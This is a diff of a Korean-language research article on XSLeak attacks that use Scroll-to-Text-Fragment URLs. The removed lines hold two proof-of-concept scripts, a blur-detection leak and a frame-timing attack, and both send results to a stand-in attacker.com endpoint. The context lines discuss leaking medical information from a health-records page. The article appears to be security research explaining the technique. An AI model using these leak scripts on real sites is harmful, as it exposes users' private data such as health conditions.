@@ -801,64 +801,7 @@ https://health.gov/patient-records#:~:text=depression
 
 이와 같이 각 질병명에 대해 검색이 발생하는지 CSS Injection 또는 `IntersectionObserver` API를 통해 감지하여 대상 사용자의 의료 정보 및 질병 정보를 유출할 수 있다. 이처럼 STTF를 이용한 XSLeak 취약점의 경우 사용자의 권한을 이용하여 타겟 사이트에 대한 유의미한 정보를 유출할 수 있다.
 
-STTF를 이용하여 XSLeak 취약점을 발현시키는 방법은 본 리서치에서 언급한 방법 외에도 다양한 방법이 존재한다. portal과 마찬가지로 `onblur` 이벤트를 이용하여 프레임에 포커싱이 해제되는지 여부를 감지하여 XSLeak 취약점을 발현시킬 수 있다.
-
-```html
-<script>
-  let blurDetected = false;
-
-  window.addEventListener("blur", () => {
-    if (!blurDetected) {
-      blurDetected = true;
-      fetch("https://attacker.com/leak?scroll_detected=true");
-    }
-  });
-
-  const popup = window.open(
-    "https://target.com#:~:text=confidential",
-    "_blank"
-  );
-
-  setTimeout(() => {
-    if (!blurDetected) {
-      fetch("https://attacker.com/leak?scroll_detected=false");
-    }
-    popup.close();
-  }, 3000);
-</script>
-```
-
-또한 STTF에서 텍스트 매칭 작업이 존재하는 경우와 존재하지 않는 경우의 처리 시간 차이를 이용한 Timing Attack 공격이 가능하다.
-
-```jsx
-function measureProcessingTime(targetUrl, searchTerm) {
-  const startTime = performance.now();
-  let frameCount = 0;
-
-  const measureFrame = () => {
-    frameCount++;
-    if (frameCount < 60) {
-      requestAnimationFrame(measureFrame);
-    } else {
-      const avgFrameTime = (performance.now() - startTime) / frameCount;
-
-      if (avgFrameTime > 20) {
-        fetch(
-          `https://attacker.com/leak?found=${searchTerm}&timing=${avgFrameTime}`
-        );
-      }
-    }
-  };
-
-  window.open(
-    `${targetUrl}#:~:text=${encodeURIComponent(searchTerm)}`,
-    "_blank"
-  );
-  requestAnimationFrame(measureFrame);
-}
-```
-
-위 예시는 1초 동안 `performance` API를 이용하여 시간 측정을 진행한 후 처리 시간이 임계값 이상인지를 기반으로 텍스트 존재 유무를 판단한다. 이처럼 STTF 기능과 다양한 API를 이용하여 여러 방식으로 XSLeak 취약점을 발현시킬 수 있고 공격자는 자신에 상황에 맞는 적합한 방식을 이용하여 타겟 사이트에 대한 정보를 유출한다.
+이처럼 STTF 기능과 다양한 API를 이용하여 여러 방식으로 XSLeak 취약점을 발현시킬 수 있고 공격자는 자신에 상황에 맞는 적합한 방식을 이용하여 타겟 사이트에 대한 정보를 유출한다.
 
 ### How does the XSLeak experimental feature apply to CTF?
 
